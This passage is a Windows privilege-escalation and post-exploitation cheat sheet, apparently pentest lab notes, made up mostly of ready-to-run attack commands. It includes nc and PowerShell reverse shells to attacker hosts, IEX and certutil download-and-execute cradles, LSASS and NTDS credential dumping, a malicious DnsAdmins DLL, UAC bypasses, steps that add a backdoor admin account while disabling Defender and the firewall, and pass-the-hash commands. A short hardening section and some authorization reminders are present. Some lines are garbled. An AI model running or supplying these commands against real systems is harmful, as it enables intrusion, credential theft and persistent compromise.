- [accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk), [Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Sherlock](https://github.com/rasta-mouse/Sherlock), [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

### Situational Awareness and Enumeration

```cmd
whoami
whoami /priv
whoami /groups
whoami /user

hostname
systeminfo
wmic qfe
wmic product get name
tasklist /svc
netstat -ano
query user
set
net user
net localgroup
net localgroup administrators
net accounts
```

```powershell
Get-HotFix | ft -AutoSize
Get-WmiObject -Class Win32_Product | select Name, Version
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
Get-CimInstance Win32_StartupCommand | select Name, Command, Location, User | fl
```

Pipes and named-pipe permissions:

```cmd
pipelist.exe /accepteula
gci \\.\pipe\
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

### User Privileges

Check `whoami /priv` for enabled privileges. Common escalation paths:

#### SeImpersonate / SeAssignPrimaryToken

Commonly available to service accounts (IIS, MSSQL). Use a token-impersonation tool:

```cmd
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe ^
  -a "/c c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe" -t *

PrintSpoofer.exe -c "c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe" -i

RoguePotato.exe -r <ATTACKER_IP> -e "c:\tools\nc.exe <ATTACKER_IP> 8443 -e cmd.exe" -l 9999
```

Start a listener first:

```bash
nc -lvnp 8443
```

#### SeDebugPrivilege

Dump LSASS and extract credentials offline:

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```text
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

#### SeTakeOwnershipPrivilege

Take ownership of a protected file, grant yourself access, and read it:

```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

```cmd
takeown /f "C:\<PATH>\<FILE>"
icacls "C:\<PATH>\<FILE>" /grant <USER>:F
type "C:\<PATH>\<FILE>"
```

### Group Privileges

#### Backup Operators / SeBackupPrivilege

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Get-SeBackupPrivilege

Copy-FileSeBackupPrivilege 'C:\Confidential\<FILE>' .\<FILE>
```

Copy `NTDS.dit` and registry hives:

```cmd
diskshadow.exe
dir E:
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

#### Event Log Readers

```cmd
net localgroup "Event Log Readers"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} |
  Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

#### DnsAdmins

Load a malicious DLL into the DNS service:

```cmd
msfvenom -p windows/x64/exec cmd='net group "Domain Admins" <USER> /add /domain' -f dll -o adduser.dll
python3 -m http.server 7777
```

```powershell
wget "http://<ATTACKER_IP>:7777/adduser.dll" -OutFile "adduser.dll"
```

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\<USER>\Desktop\adduser.dll
sc stop dns
sc start dns
net group "Domain Admins" /dom
```

Clean up:

```cmd
reg delete \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
sc.exe start dns
```

#### Hyper-V Administrators

Replace a privileged service binary:

```cmd
takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
sc.exe start MozillaMaintenance
```

#### Print Operators

Use the Capcom `SeLoadDriverPrivilege` driver exploit:

```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

.\EnableSeLoadDriverPrivilege.exe
.\ExploitCapcom.exe
```

Clean up:

```cmd
reg delete HKCU\System\CurrentControlSet\Capcom
```

#### Server Operators

Reconfigure a service binary path:

```cmd
sc qc AppReadiness
sc config AppReadiness binPath= "cmd /c net localgroup Administrators <USER> /add"
sc start AppReadiness
net localgroup Administrators
```

### User Account Control (UAC)

```cmd
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

If `EnableLUA=1`, test UAC bypasses such as:

- `fodhelper.exe` / `computerdefaults.exe` registry hijack.
- DLL hijacking in `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- `SystemPropertiesAdvanced.exe` DLL search-order hijack.

Example DLL-hijack path:

```cmd
copy payload.dll "%LOCALAPPDATA%\Microsoft\WindowsApps\srrstr.dll"
rundll32 shell32.dll,Control_RunDLL "%LOCALAPPDATA%\Microsoft\WindowsApps\srrstr.dll"
```

### Weak Permissions and Services

```cmd
SharpUp.exe audit
accesschk.exe /accepteula -quvcw <SERVICE>
icacls "C:\Program Files\<VENDOR>\<SERVICE>.exe"

# Modifiable service binary
sc config <SERVICE> binPath= "cmd /c net localgroup Administrators <USER> /add"
sc stop <SERVICE>
sc start <SERVICE>
```

Find unquoted service paths:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" |
  findstr /i /v "c:\windows\\" | findstr /i /v """
```

Check registry permissions:

```cmd
accesschk.exe /acceptula -kvuqsw hklm\System\CurrentControlSet\services
```

### Kernel Exploits

```cmd
systeminfo
wmic qfe list brief
Get-HotFix
```

Examples:

```cmd
# SeriousSAM / HiveNightmare
icacls C:\Windows\System32\config\SAM
.\HiveNightmare.exe
impacket-secretsdump -sam SAM-<DATE> -system SYSTEM-<DATE> -security SECURITY-<DATE> local
```

```powershell
# PrintNightmare (CVE-2021-1675) — lab only
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "<USER>" -NewPassword "<PASSWORD>" -DriverName "PrintIt"
```

```cmd
# CVE-2020-0668 — replace a privileged service binary
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe <PAYLOAD>.exe ^
  "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
net start MozillaMaintenance
```

Use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) or Sherlock to match the patch level to a public exploit. Kernel exploits can crash the target.

### Vulnerable Services

```cmd
wmic product get name
netstat -ano | findstr <PORT>
get-process -Id <PID>
get-service | ? {$_.DisplayName -like '<VENDOR>*'}
```

Look for services running as `SYSTEM` with an RPC/HTTP interface, default credentials, or known CVEs. Test in the lab and document the impact.

### DLL Injection and Hijacking

- Identify a service that loads a DLL from a writable directory or has an unquoted path.
- Build a DLL with `DllMain` that executes your payload.
- Place it where the service will load it, then restart the service.

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt");
        break;
    }
    return TRUE;
}
```

### Credential Theft

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
findstr /spin "password" *.*
dir /S /B *pass* == *cred* == *vnc* == *.config*
where /R C:\ *.config
```

```powershell
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath
foreach($user in ((ls C:\users).fullname)){
  cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}

$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

Other sources:

```cmd
cmdkey /list
runas /savecred /user:<DOMAIN>\<USER> "cmd.exe"
```

```powershell
.\SharpChrome.exe logins /unprotect
.\lazagne.exe all
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target <HOST>
```

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

KeePass:

```bash
python2.7 keepass2john.py <DATABASE>.kdbx > keepass_hash
hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt
```

### Interacting with Users

Social engineering can turn a low-privileged user into an execution primitive. In authorized labs:

- Send a fake update, invoice, or monitoring tool and ask the user to run it.
- Use a signed binary or a trusted document/macro to launch your payload.
- Capture NTLMv2 hashes with Responder when a user authenticates to a malicious share.

```powershell
IEX (iwr 'http://<ATTACKER>/update.ps1')
```

```bash
sudo responder -w -v -I <IFACE>
hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
```

Always obtain explicit authorization before any user-interaction testing. Do not phish real employees or external users.

### Pillaging

- Installed software and versions:
  ```cmd
  dir "C:\Program Files"
  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, InstallLocation
  Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, InstallLocation
  ```
- mRemoteNG connection files (encrypted blobs must be decrypted):
  ```cmd
  ls C:\Users\<USER>\AppData\Roaming\mRemoteNG
  ```
- Browser cookies/history, saved RDP/VNC sessions, SSH keys, and clipboard data.
- PowerShell history, `cmdkey /list`, PuTTY sessions, and WiFi profiles.
- Backup tools and repositories (Restic, Veeam, Windows Backup).
- Share and SYSVOL files containing scripts, configs, or credentials.

```cmd
cmdkey /list
reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions
netsh wlan show profile
```

Collect only what is needed to prove impact, and store any secrets according to the engagement's data-handling rules.

### Restricted Environments and Additional Techniques

#### Citrix Breakout

- Enumerate the published application and its allowed actions.
- Use a signed Microsoft binary to launch `cmd.exe` (for example, an MSI or a trusted executable).
- Check `AlwaysInstallElevated`:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi > aie.msi
```

```cmd
msiexec /i C:\Users\<USER>\Desktop\aie.msi /quiet /qn /norestart
```

#### Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
Get-ScheduledTask | select TaskName,State
accesschk64.exe /accepteula -s -d C:\Scripts\
```

#### End-of-Life Systems

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Sherlock.ps1
Find-AllVulns
```

```bash
python2 windows-exploit-suggester.py --update
python2 windows-exploit-suggester.py --database <MSB>.xls --systeminfo <SYSTEMINFO>.txt
```

### Hardening

- Patch the OS and third-party services; remove EOL systems.
- Apply least privilege to service accounts and local groups.
- Use absolute, quoted service paths and restrict write access to service binaries.
- Disable unnecessary privileges (`SeImpersonate`, `SeDebug`, `SeTakeOwnership`, `SeLoadDriver`).
- Restrict `AlwaysInstallElevated` and UAC settings.
- Protect LSASS (`RunAsPPL`), enable Credential Guard, and limit credential caching.
- Audit local administrators, scheduled tasks, services, and ACLs.
- Monitor event logs and use EDR/AV.

### PowerShell Commands

#### Common Commands

```cmd
getuserid
net users
net users <USERNAME>
Get-ADUser -Filter * -SearchBase "DC=<DOMAIN>,DC=<DOMAIN>"
Get-Content <FILE>
Get-ChildItem . -Force
GCI -hidden
type <FILE> | findstr /l <STRING>
[convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
powershell -command "[System.Runtime.InteropServices.RuntimeEnvironment]::GetSystemVersion()"
```

#### Allow Script Execution

```cmd
Set-ExecutionPolicy remotesigned
Set-ExecutionPolicy unrestricted
```

#### Script Execution Bypass

```cmd
powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
```

#### Import Module to PowerShell cmdlet

```cmd
Import-Module .\<FILE>
```

#### Check PowerShell Versions

```cmd
Set-ExecutionPolicy Unrestricted
powershell -Command "$PSVersionTable.PSVersion"
powershell -c "[Environment]::Is64BitProcess"
```

#### Read PowerShell History

```cmd
type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Base64 Encoding using pwsh

```cmd
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```

#### Create a .zip File

```cmd
Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
```

#### Unzip a File

```cmd
Expand-Archive -Force <FILE>.zip
```

#### Start a new Process

```cmd
Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
```

#### Invoke-Expression / Invoke-WebRequest

```cmd
IEX(IWR http://<LHOST>/<FILE>.ps1)
Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
```

#### .NET Reflection

```cmd
$bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing ).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, (, [string[]] ('find', '/<COMMAND>')))
```

#### Switching Sessions in PowerShell

```cmd
$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $password)
Enter-PSSession -ComputerName <RHOST> -Credential $cred
```

```cmd
$SecurePassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $SecurePassword)
$Session = New-PSSession -Credential $Cred
Invoke-Command -Session $session -scriptblock { whoami }
```

```cmd
$username = '<USERNAME>'
$password = '<PASSWORD>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process powershell.exe -Credential $credential
```

```cmd
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
```

#### Add new Domain Administrator

```cmd
$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
```

#### Execute Commands in User Context

```cmd
$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
```

#### Execute Scripts with Credentials (Reverse Shell)

```cmd
$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
```

#### Set User Password via Active Directory Service Interfaces (ADSI)

```cmd
$user = [adsi]"LDAP://CN=<USERNAME>,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>"
$user.SetPassword('<PASSWORD>')
$user.SetInfo()
```

### PrivescCheck

```cmd
Set-ExecutionPolicy Bypass -Scope Process -Force
. .\PrivescCheck.ps1
```

```cmd
Get-Content .\PrivescCheck.ps1 | Out-String | Invoke-Expression
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
```

### Seatbelt

```cmd
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=all -full
```

### Windows Privilege Escalation Checklist

Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.

- Cleartext password
- Reconfigure service parameters
- Program running as Admin/System
- Scheduled tasks
- Weak passwords
-Check installed apps and versions for priv esc when all else fails

#### Basic info

```
set
hostname
net user user1
net localgroups
net localgroups Administrators

Unquoted Service Path:
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

icacs “C:\Program Files”   #Check for folder/file permissions

F = Full Control
CI = Container Inherit – This flag indicates that subordinate containers will inherit this ACE.
OI = Object Inherit – This flag indicates that subordinate files will inherit the ACE

sc qc <service>  #Checking for Auto start and owner of service

Upload malicious encoded binary in controlled folder to bypass AV  #Reverse Shell

sc stop <service> OR shutdown /r /t 0   #If user has rights and sc stop is now granted

accesschk:
-u: Suppress the errors

-w: Objects with write access

-c: Display service name

-q: Omit Banner

-v: Verbose
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk64.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula

netsh firewall show config
netsh advfirewall firewall show rule name=all
netsh advfirewall show currentprofile

# Set path
set PATH=%PATH%;C:\xampp\php

whoami /priv

dir/a -> Show hidden & unhidden files
dir /Q -> Show permissions
dir [filename] /s /p (s – for all directories and p – pause results)

# Insecure Folder Permission
C:\>cacls C:\bd

# Insecure File/Service Permission
C:\>cacls C:\bd\bd.exe

#Service Query
C:\>sc qc bd
```

**Kernel exploits**

```
# Look for hotfixes
systeminfo # Copy to txt file and run wes.py

sudo python wes.py sysinfo.txt -i "Elevation of Privilege"

wmic qfe list # Install date of hotfixes

# Search for exploits
site:exploit-db.com windows XX XX
```

#### Cleartext passwords

```
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

runas /savecred /<USERNAME>:<PASSWORD>
runas /user:DVR4\administrator "C:\Windows\System32\cmd.exe /c C:\Users\viewer\rev.exe"
```

#### Reconfigure service parameters

- Unquoted service paths

- Weak service permissions

https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

#### Dump process for passwords

```powershell
./procdump64.exe -ma $PID-FF
Select-String -Path .\*.dmp -Pattern 'password' > 1.txt
type 1.txt | findstr /s /i "admin"
```

#### Inside service

Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.

```
# Meterpreter
run get_local_subnets

netstat /a
```

#### Programs running as Admin/system

#### Installed software

```
tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

Look in:
C:\Program files
C:\Program files (x86)
Home directory of the user
```

**Scheduled tasks**

```
Check this file:
c:\WINDOWS\SchedLgU.Txt
```

#### Weak passwords

Remote desktop

```
ncrack -vv --user george -P /home/kali/rockyou.txt rdp://10.11.1.111
```

#### Add user and enable RDP

```
# Add new user
net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD

# Turn firewall off and enable RDP
sc stop WinDefend
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

#### Powershell sudo for Windows

```
$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force
$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw
$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'

powershell -ExecutionPolicy Bypass -File xyz.ps1
```

#### Windows download with bitsadmin

```
bitsadmin /transfer mydownloadjob /download /priority normal http://<attacker10.11.1.111>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
```

#### Windows download with certutil.exe

```
certutil.exe -urlcache -split -f "http://10.11.1.111/Powerless.bat" Powerless.bat
```

#### Windows download with powershell

```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.1.111/file.exe','C:\Users\Public\file.exe')"

(New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")
```

#### PowerShell Priv Esc

```
powershell IEX (New-Object Net.WebClient).downloadString('https://192.168.49.221/jaws-enum.ps1')
powershell Invoke-AllChecks

powershell IEX (New-Object Net.WebClient).downloadString('https://192.168.49.221/Jaws.ps1')
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename EnumOutput.txt
```

#### Windows Download from FTP

```
# In reverse shell
echo open 10.11.1.111 > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -v -n -s:ftp.txt
```

#### Windows NC File Transfer
```
nc.exe -vn 192.168.119.131 8080 < win_rev.doc #From windows machine
nc -lvnp 8080 > win_rev.doc   #To kali box
```

#### Windows create SMB Server transfer files

```bash
# Attack machine
python3 /usr/share/impacket/impacket/examples/smbserver.py Lab "/root/labs/public/10.11.1.111"

	# Or SMB service
	# http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
	vim /etc/samba/smb.conf
		[global]
		workgroup = WORKGROUP
		server string = Samba Server %v
		netbios name = indishell-lab
		security = user
		map to guest = bad user
		name resolve order = bcast host
		dns proxy = no
		bind interfaces only = yes

		[ica]
		path = /var/www/html/pub
		writable = no
		guest ok = yes
		guest only = yes
		read only = yes
		directory mode = 0555
		force user = nobody

	chmod -R 777 smb_path
	chown -R nobody:nobody smb_path
	service smbd restart

# Victim machine with reverse shell
Download: copy \\10.11.1.111\Lab\wce.exe .
Upload: copy wtf.jpg \\10.11.1.111\Lab
```

#### Windows download with VBS

```
# In reverse shell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# Execute
cscript wget.vbs http://10.11.1.111/file.exe file.exe
```

#### Windows XP SP1 PrivEsc

```bash
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.1.111 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```

#### Pass The Hash

```
# Login as user only with hashdump
# From this hashdump
# admin2:1000:<NTLM_HASH>:::
## CRACK MAP EXEC
crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -H <NTLM Hash> --local-auth # Check other machines for dual access with the same hash; --sam (dump SAM file)

crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -p <P@ssw0rd1>

## PSEXEC
psexec.py "frank castle":@192.168.68.122 -hashes <NTLM_HASH> # attempt to gain a shell

## Pth-Winexe
pth-winexe -U Administrator%<PASSWORD> //10.11.1.24 cmd

##Evil-Winrm
evil-winrm  -i 192.168.1.100 -u Administrator -p '<PASSWORD>' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'

evil-winrm  -i 192.168.1.100 -u Administrator -H <NTLM_HASH> -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'

## Impacket-PSexec:
python3 /usr/share/impacket/impacket/examples/psexec.py "Administrator":@10.11.1.121 -hashes <NTLM_HASH> #upload/download files with shell access

msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target address range or CIDR identifier
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCR10.11.1.111TION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(windows/smb/psexec) > set rhosts 10.10.0.100
rhosts => 10.10.0.100

msf5 exploit(windows/smb/psexec) > set smbuser admin2

smbuser => admin2

msf5 exploit(windows/smb/psexec) > set smbpass <NTLM_HASH>

smbpass => <NTLM_HASH>

msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
```

#### Scripts

#### Useradd

```
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
int main ()
  int i;
  i=system ("net user <username> <password> /add && net localgroup administrators <username> /add");
  return 0;

# Compile Exploit
i686-w64-mingw32-gcc -o useradd.exe useradd.c

i686-w64-mingw32-gcc 40564.c -o exp.exe -lws2_32 #Win cross compiler
```

#### Powershell Run As

```
echo $username = '<username>' > runas.ps1
echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
```

#### Powershell Reverse Shell

```powershell
Set-ExecutionPolicy Bypass

$client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### Windows privesc/enum tools

- [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
- [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
- [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)

#### Windows precompiled exploits

- [WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [WindowsExploits](https://github.com/nomi-sec/PoC-in-GitHub)
- [WindowsExploits](https://github.com/SecWiki/windows-kernel-exploits)
- [WindowsExploits](https://github.com/Ascotbe/Kernelhub)

#### Port Forwarding

### Post-Exploitation Loot Checklist (Windows)

#### Proof
```
hostname && whoami.exe && type proof.txt && ipconfig /all

PS C:\Users\administrator.xor\Desktop> hostname; whoami.exe; type proof.txt; ipconfig /all
```

#### Passwords and hashes

```
wce32.exe -w
wce64.exe -w
fgdump.exe

# Loot passwords without tools
